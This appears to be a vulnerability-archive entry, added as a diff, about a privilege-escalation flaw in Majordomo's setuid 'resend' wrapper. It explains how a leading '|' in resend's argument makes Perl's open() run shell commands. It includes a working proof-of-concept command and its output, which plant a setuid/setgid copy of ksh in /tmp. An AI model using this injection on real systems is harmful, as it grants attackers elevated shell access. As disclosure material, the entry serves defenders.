@@ -1,0 +1,10 @@
+source: http://www.securityfocus.com/bid/902/info
+
+It is possible to execute arbitrary commands with elevated privileges through exploiting the majordomo binary, "resend". A setuid root wrapper program calls resend after setuid()ing and setgid()ing to lowered (but still elevated) privileges which it runs resend with. resend contains a call to open() (it is a perl script), which can be made to execute shell commands if a '|' is the first character it is passed, so if the first parameter to resend is '@|shell;commands;here', the shell commands will be executed with resend's privileges.
+
+bash-2.02$ /usr/local/majordomo/wrapper resend '@|cp /bin/ksh
+/tmp/xnec;chmod 6555 /tmp/xnec'
+resend: must specify '-l list' at /usr/local/majordomo/resend line 77.
+
+bash-2.02$ ls -la /tmp/xnec
+-r-sr-sr-x 1 owner daemon 361688 Dec 29 06:26 /tmp/xnec
